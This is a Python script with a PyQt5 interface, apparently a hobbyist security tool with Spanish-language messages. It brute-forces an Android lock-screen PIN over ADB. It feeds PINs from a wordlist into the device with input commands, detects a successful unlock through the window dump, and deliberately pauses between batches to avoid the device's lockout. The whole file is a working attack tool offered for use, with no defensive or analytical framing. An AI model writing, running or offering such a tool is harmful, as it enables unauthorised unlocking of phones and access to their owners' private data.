import sys
import os
import time
import shutil
import subprocess
import argparse
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout,
    QFileDialog, QLineEdit, QProgressBar, QMessageBox, QComboBox, QTextEdit,
    QTabWidget, QStyleFactory, QAction, QMenu, QMainWindow
)
from PyQt5.QtGui import QIcon, QColor, QTextCursor
from PyQt5.QtCore import Qt, QTimer

ANDROID_ASCII = r"""
  ▄▖   ▌    ▘ ▌  ▄     ▗     ▄▖        
  ▌▌▛▌▛▌▛▘▛▌▌▛▌▄▖▙▘▛▘▌▌▜▘█▌▄▖▙▖▛▌▛▘▛▘█▌
  ▛▌▌▌▙▌▌ ▙▌▌▙▌  ▙▘▌ ▙▌▐▖▙▖  ▌ ▙▌▌ ▙▖▙▖
        Android Brute Force Tool - V5
"""

def check_dependencies():
    if shutil.which("adb") is None:
        print("[!] adb no encontrado. Instálalo para continuar.")
        sys.exit(1)
    if shutil.which("scrcpy") is None:
        print("[!] scrcpy no encontrado. Instálalo para habilitar visualización.")

def list_adb_devices():
    try:
        result = subprocess.check_output(["adb", "devices"], encoding="utf-8")
        lines = result.strip().split('\n')[1:]
        return [line.split('\t')[0] for line in lines if 'device' in line]
    except:
        return []

def get_device_info():
    try:
        model = subprocess.check_output(["adb", "shell", "getprop", "ro.product.model"], encoding="utf-8").strip()
        serial = subprocess.check_output(["adb", "get-serialno"], encoding="utf-8").strip()
        version = subprocess.check_output(["adb", "shell", "getprop", "ro.build.version.release"], encoding="utf-8").strip()
        return model, serial, version
    except:
        return "Desconocido", "Desconocido", "Desconocido"

def try_pin_via_adb(pin):
    try:
        subprocess.run(["adb", "shell", "input", "text", pin])
        subprocess.run(["adb", "shell", "input", "keyevent", "66"])
    except:
        pass

def check_pin_success():
    try:
        output = subprocess.check_output(["adb", "shell", "dumpsys", "window"], encoding='utf-8')
        return "Keyguard" not in output and "com.android.systemui" not in output
    except:
        return False

def run_bruteforce(device, wordlist_path, digits=4, sleep_time=1000, verbose=False):
    if device:
        subprocess.run(["adb", "-s", device, "shell", "input", "keyevent", "82"])

    with open(wordlist_path, 'r') as f:
        pins = [line.strip() for line in f if len(line.strip()) == digits]

    for idx, pin in enumerate(pins):
        if verbose:
            print(f"[INFO] Trying PIN: {pin}")
        try_pin_via_adb(pin)
        time.sleep(1)
        if check_pin_success():
            print(f"\033[92m[SUCCESS] PIN Encontrado es: {pin}\033[0m")
            break
        if (idx + 1) % 4 == 0:
            if verbose:
                print(f"[PAUSE] Sleeping {sleep_time / 1000} seconds to prevent lockout")
            time.sleep(sleep_time / 1000)

class BruteForceGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Android ADB PIN Brute Forcer - V5")
        self.setGeometry(100, 100, 700, 500)
        self.setWindowIcon(QIcon.fromTheme("security-high"))
        self.dark_mode = True

        self.init_ui()
        self.apply_dark_theme()
        self.launch_scrcpy()

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        self.layout = QVBoxLayout(central)

        self.create_menu_bar()

        device_layout = QHBoxLayout()
        self.device_label = QLabel("Dispositivo: ")
        self.devices_combo = QComboBox()
        self.refresh_btn = QPushButton("Actualizar")
        self.refresh_btn.clicked.connect(self.refresh_devices)
        device_layout.addWidget(self.device_label)
        device_layout.addWidget(self.devices_combo)
        device_layout.addWidget(self.refresh_btn)

        wordlist_layout = QHBoxLayout()
        self.wordlist_input = QLineEdit()
        self.wordlist_input.setPlaceholderText("Ruta del Wordlist")
        self.select_wordlist_btn = QPushButton("...")
        self.select_wordlist_btn.clicked.connect(self.select_wordlist)
        wordlist_layout.addWidget(self.wordlist_input)
        wordlist_layout.addWidget(self.select_wordlist_btn)

        config_layout = QHBoxLayout()
        self.length_combo = QComboBox()
        self.length_combo.addItems(["4", "6", "8"])
        self.sleep_input = QLineEdit("1000")
        config_layout.addWidget(QLabel("Longitud PIN:"))
        config_layout.addWidget(self.length_combo)
        config_layout.addWidget(QLabel("Sleep (ms):"))
        config_layout.addWidget(self.sleep_input)

        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("QProgressBar::chunk { background-color: black; } QProgressBar { text-align: center; }")

        self.verbose = QTextEdit()
        self.verbose.setReadOnly(True)

        self.device_data = QLabel("Modelo: - | Serial: - | Android: -")

        self.start_btn = QPushButton("Iniciar Fuerza Bruta")
        self.start_btn.clicked.connect(self.start_attack)

        self.layout.addLayout(device_layout)
        self.layout.addLayout(wordlist_layout)
        self.layout.addLayout(config_layout)
        self.layout.addWidget(self.start_btn)
        self.layout.addWidget(self.progress_bar)
        self.layout.addWidget(QLabel("Verbose Log:"))
        self.layout.addWidget(self.verbose)
        self.layout.addWidget(QLabel("DATOS DEL DISPOSITIVO:"))
        self.layout.addWidget(self.device_data)

        self.refresh_devices()

    def create_menu_bar(self):
        menu_bar = self.menuBar()
        opciones_menu = menu_bar.addMenu("⚙ Opciones")

        toggle_theme_action = QAction("Modo Claro/Oscuro", self)
        toggle_theme_action.triggered.connect(self.toggle_theme)
        opciones_menu.addAction(toggle_theme_action)

    def toggle_theme(self):
        self.dark_mode = not self.dark_mode
        if self.dark_mode:
            self.apply_dark_theme()
        else:
            QApplication.setStyle(QStyleFactory.create("Fusion"))
            self.setStyleSheet("")

    def apply_dark_theme(self):
        QApplication.setStyle(QStyleFactory.create("Fusion"))
        palette = QApplication.palette()
        palette.setColor(palette.Window, QColor(53, 53, 53))
        palette.setColor(palette.WindowText, Qt.white)
        palette.setColor(palette.Base, QColor(25, 25, 25))
        palette.setColor(palette.AlternateBase, QColor(53, 53, 53))
        palette.setColor(palette.ToolTipBase, Qt.white)
        palette.setColor(palette.ToolTipText, Qt.white)
        palette.setColor(palette.Text, Qt.white)
        palette.setColor(palette.Button, QColor(53, 53, 53))
        palette.setColor(palette.ButtonText, Qt.white)
        palette.setColor(palette.BrightText, Qt.red)
        palette.setColor(palette.Link, QColor(42, 130, 218))
        palette.setColor(palette.Highlight, QColor(42, 130, 218))
        palette.setColor(palette.HighlightedText, Qt.black)
        QApplication.setPalette(palette)

    def log(self, message, color="white"):
        self.verbose.setTextColor(QColor(color))
        self.verbose.append(message)
        self.verbose.moveCursor(QTextCursor.End)

    def refresh_devices(self):
        self.devices_combo.clear()
        devices = list_adb_devices()
        if not devices:
            self.devices_combo.addItem("No device found")
        else:
            self.devices_combo.addItems(devices)
            model, serial, version = get_device_info()
            self.device_data.setText(f"Modelo: {model} | Serial: {serial} | Android: {version}")

    def select_wordlist(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Seleccionar Wordlist", "", "Text Files (*.txt)")
        if file_path:
            self.wordlist_input.setText(file_path)

    def start_attack(self):
        device = self.devices_combo.currentText()
        wordlist = self.wordlist_input.text()
        digits = int(self.length_combo.currentText())
        sleep_time = int(self.sleep_input.text())

        if "No device" in device:
            QMessageBox.warning(self, "Error", "No se detectó ningún dispositivo válido.")
            return

        if not os.path.exists(wordlist):
            QMessageBox.warning(self, "Error", "Ruta del wordlist inválida.")
            return

        self.log(f"[INFO] Iniciando ataque con PINs de {digits} dígitos...", color="yellow")
        with open(wordlist, 'r') as f:
            pins = [line.strip() for line in f if len(line.strip()) == digits]

        self.progress_bar.setMaximum(len(pins))

        for idx, pin in enumerate(pins):
            self.progress_bar.setValue(idx+1)
            self.progress_bar.setFormat(f"{int((idx+1)/len(pins)*100)}%")
            self.log(f"[TRY] {pin}")
            try_pin_via_adb(pin)
            time.sleep(1)
            if check_pin_success():
                self.log(f"[SUCCESS] PIN Encontrado es: {pin}", color="green")
                break
            if (idx + 1) % 4 == 0:
                self.log(f"[SLEEP] Esperando {sleep_time / 1000} segundos...")
                QApplication.processEvents()
                time.sleep(sleep_time / 1000)

        self.log("[DONE] Ataque finalizado.")

    def launch_scrcpy(self):
        if shutil.which("scrcpy") is not None:
            subprocess.Popen(["scrcpy", "--window-title", "Vista del dispositivo"])

def main():
    print(ANDROID_ASCII)
    check_dependencies()
    parser = argparse.ArgumentParser(description="Android ADB PIN Brute Forcer")
    parser.add_argument("-i", help="ID del dispositivo ADB")
    parser.add_argument("-w", help="Ruta del archivo wordlist")
    parser.add_argument("--pin4", action="store_true", help="PINs de 4 dígitos")
    parser.add_argument("--pin6", action="store_true", help="PINs de 6 dígitos")
    parser.add_argument("--pin8", action="store_true", help="PINs de 8 dígitos")
    parser.add_argument("-V", "--verbose", action="store_true", help="Verbose")
    parser.add_argument("--sleep", type=int, default=1000, help="Tiempo de espera en milisegundos entre lotes")
    parser.add_argument("--gui", action="store_true", help="Lanzar modo gráfico")
    args = parser.parse_args()

    if args.gui:
        app = QApplication(sys.argv)
        window = BruteForceGUI()
        window.show()
        sys.exit(app.exec_())
    else:
        length = 4 if args.pin4 else 6 if args.pin6 else 8 if args.pin8 else 4
        run_bruteforce(args.i, args.w, digits=length, sleep_time=args.sleep, verbose=args.verbose)

if __name__ == '__main__':
    main()

